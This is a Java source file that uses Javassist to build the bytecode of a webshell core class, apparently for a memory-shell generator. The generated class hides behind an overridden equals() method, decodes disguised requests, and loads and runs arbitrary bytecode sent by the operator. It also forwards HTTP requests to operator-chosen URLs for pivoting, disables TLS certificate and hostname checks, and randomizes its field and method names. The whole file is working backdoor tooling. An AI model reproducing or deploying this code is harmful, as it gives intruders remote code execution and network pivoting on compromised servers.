package org.leo.jmg.core;

import javassist.*;
import org.leo.core.entity.Disguise;
import org.leo.jmg.ShellGeneratorConfig;

public class LeoCore {
    Disguise reqDisguise;
    Disguise respDisguise;

    public LeoCore(Disguise reqDisguise, Disguise respDisguise) {
        this.reqDisguise = reqDisguise;
        this.respDisguise = respDisguise;
    }

    public CtClass dump(String classname, ShellGeneratorConfig config) throws CannotCompileException, NotFoundException {
        // 每次操作创建独立子池，继承父池类路径但互不影响，避免并发竞争
        ClassPool pool = new ClassPool(ClassPool.getDefault());
        CtClass ctClass = pool.makeClass(classname);
        ctClass.getClassFile().setVersionToJava5();
        CtClass ctClass0 = pool.get("java.lang.ClassLoader");
        CtClass ctClass1 = pool.get("java.lang.reflect.InvocationHandler");
        ctClass.setSuperclass(ctClass0);
        ctClass.addInterface(ctClass1);

        //fields
        {
            ctClass.addField(CtField.make("private java.util.HashMap " + config.getFieldParams() + ";", ctClass));
            ctClass.addField(CtField.make("private java.util.HashMap " + config.getFieldResults() + ";", ctClass));
            ctClass.addField(CtField.make("private static String " + config.getFieldHostId() + "= java.util.UUID.randomUUID().toString();", ctClass));
            ctClass.addField(CtField.make("private static java.util.concurrent.ConcurrentHashMap " + config.getFieldComponents() + "=new java.util.concurrent.ConcurrentHashMap();", ctClass));
        }

        //constructor
        {
            CtConstructor defaultCons = new CtConstructor(new CtClass[]{}, ctClass);
            defaultCons.setBody("{super(java.lang.Thread.currentThread().getContextClassLoader());}");
            ctClass.addConstructor(defaultCons);
        }
        //invoke (InvocationHandler - handles HostnameVerifier + X509TrustManager via Proxy)
        {
            CtMethod invoke = CtNewMethod.make(
                "public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args) throws Throwable {\n" +
                "    if (method == null) {\n" +
                "        if (args == null) { return this." + config.getFieldParams() + "; }\n" +
                "        if (args.length > 0 && args[0] instanceof java.util.HashMap) { this." + config.getFieldResults() + " = (java.util.HashMap) args[0]; return null; }\n" +
                "        return null;\n" +
                "    }\n" +
                "    String name = method.getName();\n" +
                "    if (name.equals(\"verify\")) return java.lang.Boolean.valueOf(true);\n" +
                "    if (name.equals(\"getAcceptedIssuers\")) return new java.security.cert.X509Certificate[0];\n" +
                "    return null;\n" +
                "}", ctClass);
            ctClass.addMethod(invoke);
        }
        //testConn
        {
            CtMethod testConn = CtNewMethod.make("private void " + config.getMethodTestConn() + "() {\n" +
                                                 "        this." + config.getFieldResults() + ".put(\"components\", " + config.getFieldComponents() + ".keySet().toArray(new String[" + config.getFieldComponents() + ".size()]));\n" +
                                                 "        this." + config.getFieldResults() + ".put(\"hostId\", " + config.getFieldHostId() + ");\n" +
                                                 "        this." + config.getFieldResults() + ".put(\"code\", Integer.valueOf(200));\n" +
                                                 "    }", ctClass);

            ctClass.addMethod(testConn);
        }

        //invokeComponent
        {
            CtMethod invokeComponent = CtNewMethod.make("private void " + config.getMethodInvokeComponent() + "() throws Exception {\n" +
                                                        "        String var1 = (String) this." + config.getFieldParams() + ".get(\"componentName\");\n" +
                                                        "        ClassLoader var3 = Thread.currentThread().getContextClassLoader();\n" +
                                                        "        Thread.currentThread().setContextClassLoader(this);\n" +
                                                        "        try {\n" +
                                                        "            Object var2 = ((Class)" + config.getFieldComponents() + ".get(var1)).newInstance();\n" +
                                                        "            if (var2 instanceof Runnable) { ((Runnable)var2).run(); } else { var2.equals(this); }\n" +
                                                        "        } finally {\n" +
                                                        "            Thread.currentThread().setContextClassLoader(var3);\n" +
                                                        "        }\n" +
                                                        "    }", ctClass);

            ctClass.addMethod(invokeComponent);
        }

        //loadComponent
        {
            CtMethod loadComponent = CtNewMethod.make("private void " + config.getMethodLoadComponent() + "() {\n" +
                                                      "            String var1 = (String) this." + config.getFieldParams() + ".get(\"componentName\");\n" +
                                                      "            byte[] var2 = (byte[])this." + config.getFieldParams() + ".get(\"bytecode\");\n" +
                                                      "            " + config.getFieldComponents() + ".put(var1, defineClass(var2,0,var2.length));" +
                                                      "            " + config.getFieldResults() + ".put(\"code\",Integer.valueOf(200));\n" +
                                                      "    }", ctClass);

            ctClass.addMethod(loadComponent);
        }
        //redirect
        {
            CtMethod redirect = CtNewMethod.make("" +
                                                 "private void " + config.getMethodRedirect() + "(java.util.HashMap dataMap) throws Exception {\n" +
                                                 "        String rUrl= (String) dataMap.get(\"rUrl\");\n" +
                                                 "        java.net.URL u = new java.net.URL(rUrl);\n" +
                                                 "        java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();\n" +
                                                 "        conn.setRequestMethod(\"POST\");\n" +
                                                 "        try {\n" +
                                                 "            conn.getClass().getMethod(\"setConnectTimeout\", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});\n" +
                                                 "            conn.getClass().getMethod(\"setReadTimeout\", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});\n" +
                                                 "        } catch (Exception e) {}\n" +
                                                 "        conn.setDoOutput(true);\n" +
                                                 "        conn.setDoInput(true);\n" +
                                                 "        if (javax.net.ssl.HttpsURLConnection.class.isInstance(conn)) {\n" +
                                                 "            ClassLoader cl = Thread.currentThread().getContextClassLoader();\n" +
                                                 "            javax.net.ssl.HostnameVerifier hnv = (javax.net.ssl.HostnameVerifier) java.lang.reflect.Proxy.newProxyInstance(cl, new Class[]{javax.net.ssl.HostnameVerifier.class}, this);\n" +
                                                 "            javax.net.ssl.TrustManager tm = (javax.net.ssl.TrustManager) java.lang.reflect.Proxy.newProxyInstance(cl, new Class[]{javax.net.ssl.X509TrustManager.class}, this);\n" +
                                                 "            ((javax.net.ssl.HttpsURLConnection) conn).setHostnameVerifier(hnv);\n" +
                                                 "            javax.net.ssl.SSLContext sslCtx = javax.net.ssl.SSLContext.getInstance(\"SSL\");\n" +
                                                 "            sslCtx.init(null, new javax.net.ssl.TrustManager[]{tm}, null);\n" +
                                                 "            ((javax.net.ssl.HttpsURLConnection) conn).setSSLSocketFactory(sslCtx.getSocketFactory());\n" +
                                                 "        }\n" +
                                                 "        byte[] newBody = (byte[]) dataMap.get(\"body\");\n" +
                                                 "        java.util.HashMap headers = (java.util.HashMap) dataMap.get(\"headers\");\n" +
                                                 "        java.util.Set headerKeys=headers.keySet();\n" +
                                                 "        java.util.Iterator iterator = headerKeys.iterator();\n" +
                                                 "        for (int i = 0; i < headerKeys.size(); i++) {\n" +
                                                 "            String key = (String) iterator.next();\n" +
                                                 "            if (key.equals(\"Content-Length\")) {\n" +
                                                 "                conn.setRequestProperty(key, String.valueOf(newBody.length));\n" +
                                                 "            } else if (key.equals(\"Host\")) {\n" +
                                                 "                conn.setRequestProperty(key, u.getHost());\n" +
                                                 "            } else if (key.equals(\"Connection\")) {\n" +
                                                 "                conn.setRequestProperty(key, \"close\");\n" +
                                                 "            } else if (key.equals(\"Content-Encoding\") || key.equals(\"Transfer-Encoding\")) {} else {\n" +
                                                 "                conn.setRequestProperty(key, (String) headers.get(key));}\n" +
                                                 "        }\n" +
                                                 "        java.io.OutputStream rout = conn.getOutputStream();\n" +
                                                 "        rout.write(newBody);\n" +
                                                 "        rout.flush();\n" +
                                                 "        rout.close();\n" +
                                                 "        java.io.InputStream inputStream;\n" +
                                                 "        try {\n" +
                                                 "            inputStream = conn.getInputStream();\n" +
                                                 "        }catch (java.io.IOException e) {\n" +
                                                 "            inputStream = conn.getErrorStream();\n" +
                                                 "        }\n" +
                                                 "        java.io.ByteArrayOutputStream result = new java.io.ByteArrayOutputStream();\n" +
                                                 "        byte[] buffer = new byte[1024];\n" +
                                                 "        int length;\n" +
                                                 "        while ((length = inputStream.read(buffer)) != -1) {\n" +
                                                 "            result.write(buffer, 0, length);\n" + "        }\n" +
                                                 "        " + config.getFieldResults() + ".put(\"reqUrl\",rUrl);\n" +
                                                 "        " + config.getFieldResults() + ".put(\"respData\",result.toByteArray());\n" +
                                                 "    }", ctClass);

            ctClass.addMethod(redirect);
        }
        //decode
        {
            CtMethod decode = CtNewMethod.make(reqDisguise.getDecodeBody(), ctClass);

            ctClass.addMethod(decode);
        }
        //encode
        {
            CtMethod encode = CtNewMethod.make(respDisguise.getEncodeBody(), ctClass);

            ctClass.addMethod(encode);
        }
        //action
        {
            CtMethod action = CtNewMethod.make("private void " + config.getMethodAction() + "() throws Exception {\n" +
                                               "        java.lang.Integer var1 = (java.lang.Integer)this." + config.getFieldParams() + ".get(\"M\");\n" +
                                               "        if (var1.equals(Integer.valueOf(0))) {\n" +
                                               "            this." + config.getMethodTestConn() + "();\n" +
                                               "        }\n" +
                                               "        if (var1.equals(Integer.valueOf(1))) {\n" +
                                               "            this." + config.getMethodRedirect() + "(this." + config.getFieldParams() + ");\n" +
                                               "        }\n" +
                                               "        if (var1.equals(Integer.valueOf(2)) && (this." + config.getFieldParams() + ".get(\"hostId\").equals(" + config.getFieldHostId() + "))) {\n" +
                                               "            this." + config.getMethodLoadComponent() + "();\n" +
                                               "        }\n" +
                                               "        if (var1.equals(Integer.valueOf(3)) && (this." + config.getFieldParams() + ".get(\"hostId\").equals(" + config.getFieldHostId() + "))) {\n" +
                                               "            this." + config.getMethodInvokeComponent() + "();\n" +
                                               "        }\n" +
                                               "    }", ctClass);

            ctClass.addMethod(action);
        }
        //equals
        {
            CtMethod equals = CtNewMethod.make("public boolean equals(Object var1) {\n" +
                                               "        if (!(var1 instanceof java.io.ByteArrayOutputStream)) {\n" +
                                               "            return this == var1;\n" +
                                               "        }\n" +
                                               "        this." + config.getFieldResults() + " = new java.util.HashMap();\n" +
                                               "        java.io.ByteArrayOutputStream var2 = (java.io.ByteArrayOutputStream)var1;\n" +
                                               "        try {\n" +
                                               "            this." + config.getFieldParams() + " = this.decode(var2.toByteArray());\n" +
                                               "            this." + config.getMethodAction() + "();\n" +
                                               "        } catch (Exception e) {\n" +
                                               "            " + config.getFieldResults() + ".put(\"code\",Integer.valueOf(500));\n" +
                                               "            " + config.getFieldResults() + ".put(\"msg\",e.getMessage());\n" +
                                               "        }\n" +
                                               "        try {\n" +
                                               "            var2.reset();\n" +
                                               "            byte[] var3 = this.encode(this." + config.getFieldResults() + ");\n" +
                                               "            var2.write(var3, 0, var3.length);\n" +
                                               "        } catch (Exception e2) {}\n" +
                                               "        return true;\n" +
                                               "    }", ctClass);

            ctClass.addMethod(equals);
        }
        //hashCode — equals() contract
        {
            CtMethod hashCode = CtNewMethod.make(
                "public int hashCode() { return System.identityHashCode(this); }", ctClass);
            ctClass.addMethod(hashCode);
        }
        return ctClass;
    }

    public Disguise getReqDisguise() {
        return reqDisguise;
    }

    public void setReqDisguise(Disguise reqDisguise) {
        this.reqDisguise = reqDisguise;
    }

    public Disguise getRespDisguise() {
        return respDisguise;
    }

    public void setRespDisguise(Disguise respDisguise) {
        this.respDisguise = respDisguise;
    }

    public byte[] genLeoCoreByClassName(String classname, ShellGeneratorConfig config) throws Exception {
        CtClass ctClass = dump(classname, config);
        try {
            return ctClass.toBytecode();
        } finally {
            ctClass.detach();
        }
    }

}